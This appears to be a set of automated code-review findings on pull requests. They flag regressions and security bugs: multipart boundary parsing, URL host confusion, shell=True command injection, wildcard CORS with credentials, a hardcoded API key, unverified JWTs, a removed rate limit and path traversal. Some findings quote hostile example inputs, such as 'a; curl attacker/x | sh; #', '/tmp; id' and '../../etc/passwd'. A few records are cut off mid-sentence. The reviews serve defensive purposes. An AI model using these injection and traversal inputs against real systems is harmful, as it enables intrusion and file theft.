findings.body: The moved `cookies` property changes behavior on parse failure: previously (in web.py) a bad Cookie header caused `self.clear_all_cookies()` to run; now it sets `self._cookies = None`, which will make `name in self.request.cookies` raise a TypeError in `get_cookie` and `clear_all_cookies` (since `iterkeys()`/`in` on None fails). This is a real behavior change on the error path with no test exercising a malformed Cookie header, so nothing would catch either the semantic change or a resulting crash.

findings.title: Boundary parameter never matches: missing strip() on split parts
findings.body: `content_type.split(";")` yields parameters with their leading OWS intact, e.g. `"multipart/form-data; boundary=----X"` produces `["multipart/form-data", " boundary=----X"]`. `field.partition("=")` then gives `k == " boundary"`, which never equals `"boundary"`, so the loop always falls through to the `else` and logs "Invalid multipart/form-data". Since essentially every client emits a space after the semicolon (RFC 7231 allows OWS there), this regresses *all* multipart/form-data parsing — file uploads silently produce no arguments/files, whereas the previous `'boundary=' in content_type` substring test worked. Fix by normalising each parameter: `k, sep, v = field.strip().partition("=")`.

findings.title: Parameter name not stripped: boundary never matches, multipart body dropped
findings.body:
`content_type.split(";")` yields parameters with the RFC-permitted leading whitespace intact, e.g. `" boundary=----WebKitFormBoundaryX"`. `field.partition("=")` then gives `k == " boundary"`, which never equals `"boundary"`, so the loop falls through to the `else` branch and logs "Invalid multipart/form-data" for every normal browser upload. The previous code (`'boundary=' in content_type`) matched regardless of surrounding whitespace, so this is a regression introduced by the change: form fields and files from multipart requests silently disappear from `self._request.arguments`, and any handler that relies on those arguments being present (including ones that make authorisation or ownership decisions from a posted field) now sees them missing rather than erroring out. Fix by normalising each parameter before comparing, e.g. `k, sep, v = field.strip().partition("=")`.

While touching this, note that `v` is passed to `_parse_mime_body` verbatim, so a quoted boundary (`boundary="abc"`, explicitly allowed by RFC 2045) is used with the quote characters included; stripping surrounding quotes would make the parse match what other HTTP intermediaries see.

findings.title: No test coverage for new multipart boundary-scanning logic
findings.body: The change alters how the boundary parameter is extracted from Content-Type when it is not the last field, but no test exercises a Content-Type header with boundary preceded by other parameters (e.g. 'multipart/form-data; charset=utf-8; boundary=xyz'), nor the case where boundary key has leading whitespace after splitting on ';' (e.g. 'multipart/form-data; boundary=xyz' produces k=' boundary' not 'boundary', which would fail the k == "boundary" check and silently skip parsing). Without a test, a regression here — including the whitespace mismatch bug itself — would go undetected.

findings.title: get_host picks wrong host for URLs with '@' in query or fragment
findings.body:
`get_host` splits on `://`, then on `/`, then on `@`, but never removes the query (`?`) or fragment (`#`) before the userinfo split. For `http://trusted.example?x=@attacker.example` there is no `/`, so the whole `trusted.example?x=@attacker.example` reaches the `@` branch and the function returns host `attacker.example`. `urlparse`/RFC 3986 would return `trusted.example`. The same class of mismatch occurs with `#` fragments, and with multiple `@` signs: `split('@', 1)` keeps everything after the *first* `@`, where RFC parsing uses the last one (`http://a@b@real.example/` yields host `b@real.example` here).

Wherever a URL is attacker-influenced — most obviously a `Location:` header followed on redirect, or a user-supplied URL passed to `connection_from_url` — this discrepancy lets the host that a caller validated (with `urlparse`, an allowlist, or by eye) differ from the host actually connected to, i.e. an SSRF/allowlist-bypass primitive. Strip at the first `?` or `#` before the `@` handling, and use `rpartition('@')` for userinfo, or delegate to `urlsplit`.

findings.title: No visible tests for extracted util.py helpers
findings.body: make_headers, get_host, and is_connection_dropped contain non-trivial logic (string parsing with multiple branches, error raising, platform-specific poll/select behavior) but no test file is included in this diff. If the refactor introduced a regression (e.g. in get_host's port/scheme parsing or the LocationParseError message formatting on line 100, which has an unused %s placeholder), nothing here would catch it.

findings.title: LocationParseError message never interpolates the URL
findings.body: `raise LocationParseError("Failed to parse: %s")` contains a `%s` placeholder but no argument, so the exception text literally reads `Failed to parse: %s` and the offending URL is lost. Since `url` has already been mutated by the earlier splits, pass the original input (capture it at function entry) — e.g. `raise LocationParseError("Failed to parse: %s" % original_url)`.

findings.title: accept_encoding: non-`str` string types silently replaced with 'gzip,deflate'
findings.body: The chain tests `isinstance(accept_encoding, str)` and falls through to the `else` branch for anything that is not `str` or `list`. On Python 2 a `unicode` value (e.g. `u'identity'`), and on any version a tuple or other sequence, is therefore discarded and replaced by `'gzip,deflate'` — the opposite of what the caller asked for, and silently. Given `six` is already imported on line 16, use `isinstance(accept_encoding, six.string_types)` and treat any non-string iterable via `','.join(...)`, or raise on unexpected types rather than defaulting.

findings.title: is_connection_dropped returns None or a list, not the documented bool
findings.body: The docstring promises a boolean, but the function has two inconsistent return shapes: the `select` fallback on line 117 returns a *list* (`select(...)[0]`), and the poll path returns `True` only from inside the loop — if `p.poll(0.0)` yields nothing, or yields only descriptors other than `conn.sock.fileno()`, execution falls off the end and returns `None`. Both are falsy so current `if is_connection_dropped(conn):` callers happen to work, but any caller doing `is True`, `== False`, or serialising the result gets the wrong answer. Add an explicit `return False` after the loop and coerce the select branch with `bool(...)`.

findings.title: Helpers added to util.py but no caller or re-export updated in this change
findings.body: The stated goal is "one place to import from", yet this PR touches only the new `urllib3/util.py`. Nothing in the change imports from it, and the modules that previously defined `make_headers`, `get_host` and `is_connection_dropped` are untouched, so the codebase now has two copies of each helper that can drift apart (a fix applied to one will not reach the other). If this is intentional as step one of a series, say so; otherwise the originals should be deleted and replaced with re-exports so existing `from urllib3 import get_host` / `from urllib3.connectionpool import get_host` callers keep working against a single implementation.

findings.title: order_total's wiring to discount_for is untested
findings.body: The new tests cover discount_for directly but no test calls order_total to verify it still subtracts the discount correctly from summed line amounts. If the refactor introduced a mistake in how discount_for's return value is applied (e.g. wrong argument order or sign), nothing would catch it.

findings.title: location attribute now returns URL object, not string
findings.body:
The documentation in docs/web_reference.rst states that `HTTPMove.location` is 'as the string it was constructed with' and that 'Application code compares it against configured strings and passes it to `str.startswith`'. However, this change assigns `URL(location)` to `self.location`, making it a `URL` object rather than a string. Callers expecting a string will break. Either revert to storing the string, or update the documentation and ensure callers are prepared for the type change.

_Also raised by the security agent:_ location type change can break string-based redirect-target checks

_Also raised by the correctness agent:_ `HTTPMove.location` now returns a URL object instead of the source string

findings.title: No test guards self.location's documented str type
findings.body: self.location is now assigned a URL object instead of a str (previously `self.location = location`, now `self.location = URL(location)`). Per docs/web_reference.rst, application code relies on `location` being 'the string it was constructed with' and calls `str.startswith` on it. This diff changes that contract but includes no test verifying `isinstance(exc.location, str)` or that `.startswith` still works — if the type change is wrong, nothing in the test suite would fail.

findings.title: readany can return empty bytes before EOF after loop removal
findings.body:
`_wait()` documents that its future is also resolved at the end of a chunk, which can occur with no new data in the buffer, and that "a caller must re-check its condition after waking rather than assuming data arrived." The `while` loop was exactly that re-check. With `if`, a single spurious/chunk-boundary wake falls straight through to `self._read_nowait(-1)`, which returns an empty result even though `self._eof` is False. Callers of `readany()` conventionally treat an empty return as end-of-stream, so this silently truncates streams at chunk boundaries. Restore the `while` loop (or otherwise loop until `self._buffer or self._eof`).

_Also raised by the security agent:_ readany can return empty bytes on spurious wake, truncating attacker-framed bodies

findings.title: No test covers spurious-wake / empty-buffer-after-wait behavior
findings.body: The change replaces a `while` loop with a single `if`, removing the re-check after `_wait` returns. The docstring for `_wait` explicitly warns that the waiter can be resolved 'at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking.' This is exactly the case the `while` loop was guarding against. There is no test in this PR (or apparent in the surrounding code) that simulates a wake with an empty buffer and eof still false to verify `readany` behaves correctly after this change — such a regression would pass silently.

findings.title: Implicit relative import breaks package import on Python 3
findings.body: `requests/sessions.py` lives inside the `requests` package, so `adapters` is a sibling module, not a top-level one. Under Python 3 (and under Python 2 with `from __future__ import absolute_import`), all imports are absolute, so `from adapters import HTTPAdapter` resolves against `sys.path` rather than the package and raises `ImportError: No module named 'adapters'` — which makes importing `requests.sessions`, and therefore `requests` itself, fail outright. Even where it does resolve, it can silently pick up an unrelated top-level `adapters` module that happens to be on `sys.path`, shadowing the intended one. This is not the same module under a cleaner form; restore `from .adapters import HTTPAdapter`.

findings.title: Import change breaks relative package structure
findings.body:
This change removes the leading dot from a relative import, converting it from `from .adapters import HTTPAdapter` to `from adapters import HTTPAdapter`. This changes the import from intra-package (relative to the current package) to an absolute import that will search sys.path. This breaks the code if there is no top-level `adapters` module available—it will fail at runtime with a ModuleNotFoundError. The relative form ensures the import finds the correct module within the requests package structure.

_Also raised by the security agent:_ Absolute `import adapters` allows sys.path module shadowing

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
`self.request.cookies` is documented to return `None` when the `Cookie` header is present but unparseable (see `tornado/httpserver.py`, which returns `None` if `self._cookies is None` and states "every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable` on any request carrying a malformed Cookie header — turning a benign "cookie not found, return default" path into a 500. Restore the `self.request.cookies is not None and` guard, or change the property to return an empty mapping instead of `None` (and update its docstring and all other consumers accordingly).

_Also raised by the security agent:_ Malformed Cookie header now causes TypeError (500) in get_cookie

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Dropping strip() breaks boundary detection in multipart Content-Type
findings.body:
`content_type.split(";")` leaves the conventional space after each semicolon on the following segment, so for the ubiquitous header `multipart/form-data; boundary=----WebKitFormBoundaryXYZ` the second element is `" boundary=----WebKitFormBoundaryXYZ"`. With `.strip()` removed, `partition("=")` yields `k == " boundary"`, the `k == "boundary"` test on line 5 fails, the loop finishes without ever calling `_parse_mime_body`, and the request body is silently dropped — all multipart form/file uploads stop being parsed with no error raised.

The `.strip()` was not redundant: it normalised both the key and, via the whole-field strip, any trailing whitespace on the value. Restore it: `k, sep, v = field.strip().partition("=")` (or strip `k` and `v` individually).

findings.title: Boundary parsed from Content-Type without whitespace normalisation
findings.body:
`content_type` comes from the client-supplied `Content-Type` request header; it is split on `;` and each parameter is now partitioned on `=` with no `.strip()`. Two consequences reach the `self._parse_mime_body(v, data)` sink on line 6:

1. For the ordinary, RFC-conformant spelling `multipart/form-data; boundary=abc`, the second field is `" boundary=abc"`, so `k` is `" boundary"` and the `k == "boundary"` test on line 5 fails. The multipart body is silently never parsed — no error, just missing arguments/files. Any handler that relies on the presence of a field (or on a validated upload) sees an empty body instead.
2. When a client omits the space (`multipart/form-data;boundary=abc `), `v` now keeps any trailing whitespace and is passed verbatim as the boundary. Tornado will then split parts on `abc ` while an upstream proxy, WAF or body-inspecting middleware that normalises the parameter splits on `abc`. That parser differential lets an attacker craft a body whose parts are invisible to the inspecting component but visible to the application.

Restore the normalisation: `k, sep, v = field.strip().partition("=")` (and ideally strip the value independently before use).

findings.title: No test covers whitespace-in-boundary-field parsing change
findings.body: The diff removes `.strip()` before partitioning each `;`-separated field of a multipart Content-Type header. This changes behavior for headers like `multipart/form-data; boundary=xyz` (note the space after `;`), since `k` would now be `" boundary"` instead of `"boundary"`, causing the `k == "boundary"` check on line 5 to fail and the boundary to never be detected. No test file is included in this PR to exercise a Content-Type header with a space after the semicolon (the common, RFC-typical form), so this regression would not be caught.

findings.title: No test would catch the broken format string
findings.body: The change removes the `% url` argument from the format string, so `LocationParseError("Failed to parse: %s")` will produce a literal '%s' instead of the failing port value. If no existing test asserts on the exact exception message content for this parse-error path, this regression would go undetected.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The `% url` argument was removed but the `%s` conversion specifier was kept, so the exception message is the literal string `Failed to parse: %s`. Callers and logs lose the only piece of diagnostic information that identified which URL failed, and the stray `%s` looks like a bug to anyone reading the traceback. If the goal is a shorter message, drop the placeholder too (`LocationParseError(url)` or `LocationParseError("Failed to parse: %s" % url)`); do not leave an un-interpolated format string.

findings.title: Command injection: f-string command executed with shell=True
findings.body:
`create_archive` interpolates `name` and `directory` into a single command string and passes it to `subprocess.run(..., shell=True)`. Any shell metacharacter in either argument escapes the intended `tar` invocation: `create_archive("a; curl attacker/x | sh; #", d)` or `directory="/tmp; id"` runs arbitrary commands with the privileges of the service process. The same file already demonstrates the safe pattern on line 5 (`subprocess.run(["ls", directory], ...)`).

Fix: drop `shell=True` and pass an argument list, e.g.

```python
archive_path = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", archive_path, directory], check=True)
```

Separately, `name` is concatenated into the output path with no validation, so a value like `../../etc/cron.d/evil` writes the tarball outside `/exports`. Validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9_-]+$`) and verify the resolved path stays under `/exports` before writing. Because the caller is not visible in this change, the reachability of untrusted input depends on unseen code — but the sink itself is unsafe regardless of caller.

_Also raised by the correctness agent:_ Unquoted f-string interpolation into shell=True breaks on spaces/metachars

findings.title: New create_archive function has no test coverage
findings.body: create_archive builds a shell command string from `name` and `directory` and executes it via subprocess.run(shell=True). No test exists in this diff (or apparently in the repo, since list_exports also lacks visible tests) exercising this function's behavior — e.g. verifying the tarball is created with expected arguments, or verifying rejection of malicious/invalid input. If the command construction were broken or made unsafe, nothing would fail.

findings.title: Returns CompletedProcess while sibling returns bytes; tar stderr is discarded
findings.body: `list_exports` returns `.stdout` (bytes), but `create_archive` returns the whole `CompletedProcess`. Callers of this module will get inconsistent return types from two functions that otherwise look symmetric. Separately, without `capture_output=True` tar's stderr goes to the parent process's stderr rather than being attached to the `CalledProcessError` raised by `check=True`, so a common failure (e.g. `/exports` does not exist) surfaces as an exception with no diagnostic message. Decide on one return contract, and capture output so the failure reason is available to the caller.

findings.title: Public function lacks parameter and return documentation
findings.body: The `create_archive` function is exported (not private) and takes parameters whose semantics are not self-evident from their names alone. A caller cannot reliably determine what format `name` should take (e.g., whether to include or exclude the `.tar.gz` extension), what `directory` must be (absolute path? relative? must exist?), or what the return value represents. Add a docstring documenting these contract details.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` origin allowlist that the existing middleware (lines 6-7) enforces. Any route mounted with this middleware accepts cross-origin requests from every origin on the internet; if credentials are honoured, an attacker page can issue authenticated requests with the victim's cookies and read the responses — full CSRF-plus-read against any authenticated endpoint behind it.

Two things to note:
- Per the Fetch spec browsers reject `Access-Control-Allow-Origin: *` on credentialed requests, so as written the dashboard will *not* work. The usual next step is to switch to origin reflection (`origin: true` or echoing the request `Origin` header), which is the fully exploitable version of this same bug. Do not take that path.
- The correct fix is to add the dashboard's origin to the existing `ALLOWED` allowlist and reuse the current middleware, rather than introducing a second, unrestricted one.

I cannot see which routes mount `dashboardCors`, so the blast radius is unverified from this diff — but the configuration itself is an allowlist widened to admit anything.

findings.title: Wildcard origin with credentials is rejected by browsers
findings.body:
`dashboardCors` sets `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. The Fetch spec forbids this combination: when a request is made in credentials mode, a response whose `Access-Control-Allow-Origin` is the literal `*` fails the CORS check and the browser discards it. So this middleware cannot achieve what the PR describes — the dashboard still will not be able to call the API with cookies, and the failure will surface as an opaque CORS error rather than a clear one.

The working form is to echo back a specific allowed origin (e.g. add the dashboard origin to the existing `ALLOWED` list, or pass a function/array that resolves the request `Origin` against an allow-list) while keeping `credentials: true`. As a side effect that also avoids handing credentialed access to every origin on the internet, which is what the wildcard would mean if a client ever did honour it.

findings.title: New dashboardCors config has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, a configuration that most CORS middleware either rejects at runtime or silently mishandles (browsers reject wildcard origin with credentials). There is no test in this diff verifying the actual behavior of this middleware (e.g., what Access-Control-Allow-Origin header value is produced, or whether requests with credentials succeed as intended). If the middleware library changes behavior or this config is broken, nothing here would catch it.

findings.title: Public CORS export lacks documentation of its contract
findings.body: The `dashboardCors` export is a public API that lacks a docstring or comment explaining its purpose and constraints. A caller seeing `origin: "*"` with `credentials: true` may not understand the security implications or the specific use case this is intended for. Add a JSDoc comment explaining: (1) what this CORS configuration is for, (2) why this particular combination of settings is safe in this context, and (3) any constraints on where it should be used.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal on line 4 and assigned to `acmepay.api_key` on line 8, replacing the previous `os.environ["ACMEPAY_SECRET_KEY"]` read (the `import os` removal confirms the env path is gone). _Also raised by the docs agent:_ Live API secret hardcoded in source code

findings.title: Env-var configuration removed: every environment now uses the live key
findings.body: `client()` previously read the key from `os.environ["ACMEPAY_SECRET_KEY"]`, which meant (a) each deployment supplied its own key and (b) a missing key raised `KeyError` immediately rather than silently charging the wrong account. findings.title: tenant_of() returns a tenant id from an unverified token
findings.body:
`tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` comes from a payload that was never checked against `public_key()`. A JWT payload is just base64 — anyone holding a token (or forging one from scratch) can set `tenant_id` to any value and this function will return it. If the result is used to scope queries or authorise access, that is cross-tenant access with no exploit chain beyond editing a string.

The module already has the correct primitive one line above: build on `claims_for(token)` and read `tenant_id` from the verified claims. If the motivation was avoiding the `public_key()` round-trip, cache the key rather than dropping verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: Public function `tenant_of()` lacks documentation of unverified token usage
findings.body: The function `tenant_of()` is a public API that decodes JWTs without signature verification. A caller could reasonably assume a token passed to this function has been validated, or that this function performs validation. The current implementation silently decodes unverified tokens, which is a significant behavioral contract that should be explicitly documented. Add a docstring explaining that the token signature is NOT verified and why this is safe in the caller's context.

findings.title: New unverified-token tenant extraction has no test coverage
findings.body: tenant_of() is a new function that decodes a JWT without verifying its signature and returns the tenant_id claim. findings.title: Direct indexing raises KeyError when the token has no tenant_id

findings.title: update_payment_method mutates object without ownership check
findings.body:
`update_payment_method` resolves `pm` directly from the caller-supplied `pm_id` (line 12) and writes to it (lines 13–14) without ever calling `require_owner`. `current_user(request)` is called on line 11 and the result is bound to `user`, but `user` is never used — so the handler authenticates and then never authorises. findings.title: Public API missing authorization contract
findings.body: The function `update_payment_method()` is a public, exported endpoint that mutates a payment method. findings.title: Rate limit removed from password reset entry point
findings.body:
`request_reset` was the throttled entry point for password reset and is now unlimited: the `@rate_limit("5/hour")` decorator and its import are both deleted, and nothing else in the function bounds call frequency. The attacker-controlled input is the `email` argument, which flows directly into `send_reset_email(email)` on line 2 with no intervening check.

The stated justification — that the email provider already throttles — covers only one of the risks. Provider-side throttling is typically per-sending-account or per-recipient at the SMTP layer; it does not stop:

- **Mail bombing / harassment**: an attacker replays the endpoint against one victim address, and every accepted request costs a real send.
- **Account enumeration and reset-token churn**: if each request mints a new reset token, an unbounded caller can force large numbers of valid tokens into existence, which meaningfully helps anyone trying to guess one.
- **Resource exhaustion on your side**: token generation, DB writes and outbound calls all happen before the provider ever sees the message, so provider throttling rejects work you have already paid for.

If the limiter genuinely is redundant, the right move is to keep an application-level cap (per source IP *and* per target email) and document why the number was chosen. Restoring the decorator is the smallest safe change.

findings.title: Reset path now has no throttle of its own; provider throttle is not equivalent
findings.body: With the decorator gone, `request_reset` performs an unbounded number of `send_reset_email` calls per caller — nothing in this file limits invocation frequency. The stated justification is that the email provider throttles, but provider-side throttling is normally per sending account or per recipient over a longer window, not per requester, so it does not reproduce the removed `5/hour` semantics: a caller can loop on a single victim address and the code path will happily keep issuing resets while the handler still returns `{"sent": True}` on every call, giving no signal that anything was suppressed. If the limiter really is redundant, the equivalence should be demonstrated (which provider limit, what window, keyed on what) before the in-process guard is dropped; otherwise keep the decorator, or move the limit into `send_reset_email` so every caller of that helper inherits it.

findings.title: No test guards password reset rate-limit behavior
findings.body: The rate_limit decorator was removed from request_reset with no accompanying test change. If this is a security-relevant behavior change (relying on an external provider's throttling instead of an in-app limiter), nothing in the diff verifies the endpoint's request-handling behavior at all, so a future accidental re-addition or removal of throttling logic would go undetected by any test.

findings.title: read_export_preview skips _confined(), allowing path traversal
findings.body:
The existing download function resolves the caller-supplied name through `_confined(name)` (line 14) before opening it; the new `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` directly (line 20). `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` walks out of `EXPORT_ROOT`, and an absolute `name` such as `/etc/passwd` discards `EXPORT_ROOT` entirely, so any file readable by the process can be returned (first `limit` bytes). The PR description says the preview path 'reuses the same layout as download' — it does not reuse the containment check. Change line 20 to `path = _confined(name)` so both entry points share one enforcement point.

_Also raised by the security agent:_ Preview path skips _confined(), allowing arbitrary file read

findings.title: Public API contract undocumented: path traversal vulnerability
findings.body: The function `read_export_preview(name, limit=4096)` accepts a `name` parameter that is passed directly to `os.path.join(EXPORT_ROOT, name)` without the `_confined()` safety check that protects the existing `read_export()` function on line 14. A caller reading only this function's signature and name would reasonably assume it is safe to pass user-supplied input, as the parallel function above demonstrates that pattern. The absence of any docstring or comment explaining why this function lacks the confinement check — and what preconditions callers must meet — leaves the safety contract undocumented. This is a public API (export to the file and implicitly callable) whose correct usage cannot be determined from its name and signature alone.
